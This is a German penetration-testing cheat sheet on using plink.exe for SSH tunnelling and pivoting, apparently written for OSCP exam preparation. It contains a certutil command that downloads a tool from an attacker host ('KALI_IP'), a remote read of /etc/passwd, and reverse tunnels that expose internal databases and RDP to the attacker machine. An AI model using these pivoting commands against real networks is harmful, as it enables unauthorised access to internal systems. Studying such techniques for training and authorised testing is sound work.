# plink.exe - SSH Client & Port Forwarding Tool für Windows

## Was ist plink?

plink (PuTTY Link) ist die Command-Line-Version von PuTTY. Essenziell für SSH-Verbindungen und Port Forwarding von Windows-Systemen.

**Verwendung:**
- SSH-Verbindungen von Windows
- Port Forwarding (Local/Remote/Dynamic)
- Pivoting in Windows-Umgebungen
- Tunnel für Tools wie SQLMap, Nmap, etc.

---

## Download

```powershell
# PuTTY Download Page
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

# Direkt plink.exe
https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe  # 64-bit
https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe  # 32-bit

# Auf Kali hosten, auf Windows downloaden
certutil -urlcache -f http://KALI_IP/plink.exe plink.exe
```

---

## Basis-Syntax

```cmd
plink.exe [options] [user@]host [command]
```

---

## Authentifizierung

### Mit Passwort

```cmd
# Standard SSH-Verbindung
plink.exe -ssh user@192.168.1.100 -pw password

# Explizite Syntax
plink.exe -ssh -l username -pw password 192.168.1.100

# Ohne -batch (interaktive Passwort-Eingabe)
plink.exe -ssh user@192.168.1.100
```

### Mit Private Key

```cmd
# PPK-File (PuTTY Format)
plink.exe -ssh user@192.168.1.100 -i C:\keys\id_rsa.ppk

# OpenSSH Key zu PPK konvertieren (via PuTTYgen)
# PuTTYgen → Load private key → Save private key as .ppk
```

### Batch Mode (Keine Prompts)

```cmd
# WICHTIG für Scripts!
plink.exe -ssh -l user -pw password -batch 192.168.1.100

# Akzeptiert automatisch Host Key
# Keine interaktiven Prompts
```

---

## Port Forwarding

### Local Port Forwarding (-L)

**Traffic von lokalem Port zu Remote-Ziel forwarden**

```cmd
# Syntax
plink.exe -ssh -l user -pw password -L LOCAL_PORT:TARGET_IP:TARGET_PORT SSH_SERVER

# Beispiel: MySQL von 192.168.159.96:3306 auf localhost:3306
plink.exe -ssh -l kali -pw password 192.168.1.178 -L 3306:192.168.159.96:3306

# Mehrere Forwards
plink.exe -ssh -l user -pw pass JUMP_HOST -L 3306:DB1:3306 -L 8080:WEB1:80

# Bind auf alle Interfaces (0.0.0.0)
plink.exe -ssh -l user -pw pass HOST -L 0.0.0.0:8080:TARGET:80
```

**Use Case:**
```cmd
# 1. Tunnel erstellen
plink.exe -ssh -l kali -pw kali 192.168.1.178 -L 3306:192.168.159.96:3306 -N

# 2. Tool nutzen (auf Windows)
mysql -h 127.0.0.1 -P 3306 -u root -p
```

### Remote Port Forwarding (-R)

**Traffic vom Remote-Server zum lokalen/anderen Ziel forwarden**

```cmd
# Syntax
plink.exe -ssh -l user -pw password -R REMOTE_PORT:TARGET_IP:TARGET_PORT SSH_SERVER

# Beispiel: MySQL auf Kali:9833 → Windows-Netzwerk:3306
plink.exe -ssh -l kali -pw password 192.168.1.178 -R 9833:192.168.159.96:3306

# Bind auf allen Interfaces des SSH-Servers
plink.exe -ssh -l kali -pw pass 192.168.1.178 -R 0.0.0.0:9833:192.168.159.96:3306

# Mehrere Reverse Forwards
plink.exe -ssh -l user -pw pass HOST -R 8080:TARGET1:80 -R 3389:TARGET2:3389
```

**Use Case - Reverse Pivot:**
```cmd
# Szenario: Windows hat Zugriff auf internes Netz, Kali nicht

# 1. Windows: Reverse Forward erstellen
plink.exe -ssh -l kali -pw kali 192.168.1.178 -R 0.0.0.0:9833:192.168.159.96:3306 -N

# 2. Kali: Über localhost:9833 zugreifen
mysql -h 127.0.0.1 -P 9833 -u root -p

# 3. Oder für andere Kali-Tools
sqlmap -u "http://127.0.0.1:9833/..."
```

### Dynamic Port Forwarding (-D)

**SOCKS Proxy erstellen**

```cmd
# Syntax
plink.exe -ssh -l user -pw password -D LOCAL_PORT SSH_SERVER

# Beispiel: SOCKS Proxy auf localhost:1080
plink.exe -ssh -l kali -pw password 192.168.1.178 -D 1080

# Dann proxychains (auf Kali) ODER
# Windows-Tools mit SOCKS-Support nutzen
```

**Use Case - SOCKS Proxy:**
```cmd
# 1. Windows: SOCKS Proxy erstellen
plink.exe -ssh -l kali -pw kali 192.168.1.178 -D 1080 -N

# 2. Configure Tools
# Firefox: Settings → Network → SOCKS5 → localhost:1080
# Proxifier (Windows): Profile → Proxy Servers → Add SOCKS5 localhost:1080

# 3. Alle Tools gehen durch Tunnel
```

---

## Wichtige Optionen

### Connection Options

```cmd
-N                  # Keine Shell, nur Forward (besser für Tunnel)
-batch              # Non-interactive (keine Prompts)
-T                  # Disable PTY allocation
-C                  # Enable compression
-v                  # Verbose output (debugging)
-4                  # Force IPv4
-6                  # Force IPv6
```

### Port Forwarding Options

```cmd
-L port:host:port   # Local forward
-R port:host:port   # Remote forward
-D port             # Dynamic forward (SOCKS)
-N                  # No shell (tunnel only)
-f                  # Background (nicht empfohlen, unstable)
```

### Authentication

```cmd
-l user             # Username
-pw password        # Password
-i keyfile          # Private key file (.ppk)
-batch              # Accept defaults (wichtig!)
```

---

## Praktische OSCP-Workflows

### Workflow 1: MySQL über Pivot

```cmd
# Szenario:
# Kali → Windows (192.168.1.178) → MySQL Server (192.168.159.96:3306)

# Windows:
plink.exe -ssh -l kali -pw kali 192.168.1.178 -R 0.0.0.0:9833:192.168.159.96:3306 -N -batch

# Kali:
mysql -h 127.0.0.1 -P 9833 -u root -p
# Oder
sqlmap -u "mysql://root:pass@127.0.0.1:9833/database"
```

### Workflow 2: RDP über Tunnel

```cmd
# Local Forward für RDP
plink.exe -ssh -l kali -pw kali JUMP_HOST -L 3389:TARGET:3389 -N -batch

# Dann RDP zu localhost
mstsc /v:localhost:3389
# Oder
xfreerdp /v:localhost:3389 /u:administrator /p:password
```

### Workflow 3: Multi-Hop Pivoting

```cmd
# Kali → Windows1 → Windows2:80

# Windows1:
plink.exe -ssh -l kali -pw kali KALI_IP -R 8080:WINDOWS2:80 -N -batch

# Kali: Zugriff über localhost:8080
curl http://localhost:8080
```

### Workflow 4: SOCKS Proxy für vollständigen Netzwerk-Zugriff

```cmd
# Windows:
plink.exe -ssh -l kali -pw kali KALI_IP -D 1080 -N -batch

# Kali: /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# Dann:
proxychains nmap -sT -Pn 192.168.159.0/24
proxychains firefox
```

---

## Remote Command Execution

### Single Command

```cmd
# Command ausführen
plink.exe -ssh -l user -pw password HOST "whoami"

# Mehrere Commands
plink.exe -ssh -l user -pw pass HOST "whoami; id; hostname"

# Output in File
plink.exe -ssh -l user -pw pass HOST "cat /etc/passwd" > passwd.txt
```

### Interactive Shell

```cmd
# Ohne Command = Interactive
plink.exe -ssh -l user -pw password HOST

# Mit PTY
plink.exe -ssh -l user -pw password -t HOST
```

---

## Troubleshooting

### "Host Key Verification Failed"

```cmd
# Problem: Host key nicht trusted

# Lösung: -batch flag
plink.exe -ssh -batch -l user -pw pass HOST

# Oder: Host key manuell akzeptieren (einmalig interaktiv)
plink.exe -ssh -l user -pw pass HOST
# → "yes" eingeben
```

### "Connection Refused"

```cmd
# SSH-Port prüfen
# Standard: 22
# Custom: -P PORT

plink.exe -ssh -l user -pw pass -P 2222 HOST
```

### "Access Denied"

```cmd
# Credentials prüfen
# Passwort korrekt?
# User existiert?

# Verbose mode für debugging
plink.exe -ssh -v -l user -pw pass HOST
```

### "GatewayPorts" Problem (Remote Forwarding)

```cmd
# Problem: Remote Forward bindet nur auf 127.0.0.1

# Lösung: SSH-Server /etc/ssh/sshd_config
GatewayPorts yes
# Oder
GatewayPorts clientspecified

# Dann: sshd restart
sudo systemctl restart sshd

# Jetzt funktioniert:
plink.exe -ssh -l user -pw pass HOST -R 0.0.0.0:9833:TARGET:PORT
```

### Tunnel bleibt nicht stabil

```cmd
# Keep-alive aktivieren
# Auf SSH-Server: /etc/ssh/sshd_config
ClientAliveInterval 60
ClientAliveCountMax 3

# Oder mit TCPKeepAlive
plink.exe -ssh -l user -pw pass -o TCPKeepAlive=yes HOST -R ...
```

---

## Alternativen zu plink

### SSH.exe (Windows 10+)

```powershell
# Windows 10 ab 1809 hat OpenSSH Client

# Local Forward
ssh -L 3306:TARGET:3306 user@JUMPHOST -N

# Remote Forward
ssh -R 9833:TARGET:3306 user@JUMPHOST -N

# Dynamic Forward
ssh -D 1080 user@JUMPHOST -N
```

### Chisel (Cross-Platform)

```cmd
# Windows + Linux kompatibel
# Reverse Port Forwarding über HTTP

# Kali (Server):
chisel server -p 8000 --reverse

# Windows (Client):
chisel.exe client KALI_IP:8000 R:9833:INTERNAL_TARGET:3306
```

### netsh (Windows Native - Port Forwarding)

```cmd
# Keine SSH benötigt, aber nur lokal/remote auf Windows

netsh interface portproxy add v4tov4 listenport=9833 listenaddress=0.0.0.0 connectport=3306 connectaddress=192.168.159.96
```

---

## SSH Server auf Kali vorbereiten

### SSH Server starten

```bash
# SSH installieren (falls nicht vorhanden)
sudo apt install openssh-server

# Starten
sudo systemctl start ssh

# Auto-start
sudo systemctl enable ssh

# Status
sudo systemctl status ssh
```

### GatewayPorts aktivieren (für Remote Forwards)

```bash
# /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config

# Zeile hinzufügen/ändern:
GatewayPorts yes
# Oder für mehr Kontrolle:
GatewayPorts clientspecified

# SSH neu starten
sudo systemctl restart ssh
```

### Password Authentication aktivieren

```bash
# /etc/ssh/sshd_config
PasswordAuthentication yes

# Restart
sudo systemctl restart ssh
```

---

## Tipps & Tricks

### 1. Background ausführen (Windows)

```cmd
# Nicht -f nutzen (unstable)
# Stattdessen: start /B

start /B plink.exe -ssh -l kali -pw kali HOST -R 9833:TARGET:3306 -N -batch

# Oder als Scheduled Task
```

### 2. Automatisches Reconnect (Script)

```cmd
@echo off
:loop
plink.exe -ssh -l kali -pw kali 192.168.1.178 -R 9833:192.168.159.96:3306 -N -batch
timeout /t 5
goto loop
```

### 3. Multiple Forwards gleichzeitig

```cmd
plink.exe -ssh -l kali -pw kali HOST ^
  -L 3306:DB:3306 ^
  -L 80:WEB:80 ^
  -L 445:DC:445 ^
  -R 8080:INTERNAL:80 ^
  -N -batch
```

### 4. Credentials aus File lesen (sicherer)

```cmd
# PowerShell
$cred = Get-Credential
$password = $cred.GetNetworkCredential().Password
.\plink.exe -ssh -l user -pw $password HOST -R 9833:TARGET:3306 -N -batch
```

---

## Quick Reference

### Local Port Forward (-L)
```cmd
# localhost:PORT → TARGET:PORT via SSH_SERVER
plink.exe -ssh -l user -pw pass SSH_SERVER -L LOCAL_PORT:TARGET:TARGET_PORT -N -batch
```

### Remote Port Forward (-R)
```cmd
# SSH_SERVER:PORT → TARGET:PORT
plink.exe -ssh -l user -pw pass SSH_SERVER -R REMOTE_PORT:TARGET:TARGET_PORT -N -batch

# Mit 0.0.0.0 für alle Interfaces
plink.exe -ssh -l user -pw pass SSH_SERVER -R 0.0.0.0:REMOTE_PORT:TARGET:TARGET_PORT -N -batch
```

### Dynamic Forward (-D)
```cmd
# SOCKS Proxy auf localhost:PORT
plink.exe -ssh -l user -pw pass SSH_SERVER -D LOCAL_PORT -N -batch
```

### Wichtigste Flags
```cmd
-N          # No shell (tunnel only)
-batch      # No interactive prompts
-C          # Compression
-v          # Verbose
-l user     # Username
-pw pass    # Password
-i key.ppk  # Private key
```

---

## OSCP Exam Tips

1. **-batch verwenden** - Immer! Sonst hängt Script
2. **GatewayPorts auf Kali** - Für Remote Forwards essentiell
3. **0.0.0.0 binden** - Damit andere Tools zugreifen können
4. **-N flag** - Nur Tunnel, keine Shell
5. **Reverse Forward bevorzugen** - Windows → Kali ist einfacher
6. **plink.exe mitbringen** - In Tools-Ordner vorbereiten
7. **SSH Server auf Kali testen** - VOR dem Exam
8. **Alternative: Chisel** - Falls plink Probleme macht

---

## OSCP Original Command Erklärt

```cmd
c:\plink.exe -ssh -l kali -pw test 192.168.1.178 -R 0.0.0.0:9833:192.168.159.96:3306
```

**Breakdown:**
- `c:\plink.exe` - Binary ausführen
- `-ssh` - SSH-Protokoll
- `-l kali` - Username: kali
- `-pw test` - Passwort: test
- `192.168.1.178` - SSH-Server (Kali)
- `-R 0.0.0.0:9833:192.168.159.96:3306` - Reverse Forward
  - `0.0.0.0` - Auf allen Interfaces des SSH-Servers (Kali) binden
  - `9833` - Port auf Kali
  - `192.168.159.96` - Ziel-IP (von Windows aus erreichbar)
  - `3306` - Ziel-Port (MySQL)

**Ergebnis:**
- Kali Port 9833 → weitergeleitet über Windows → 192.168.159.96:3306
- Von Kali aus: `mysql -h 127.0.0.1 -P 9833` verbindet zu internem MySQL-Server

---

## Resources

- PuTTY Download: https://www.chiark.greenend.org.uk/~sgtatham/putty/
- Documentation: https://www.ssh.com/academy/ssh/putty/putty-manuals/0.68/Chapter7.html
- Port Forwarding Guide: https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
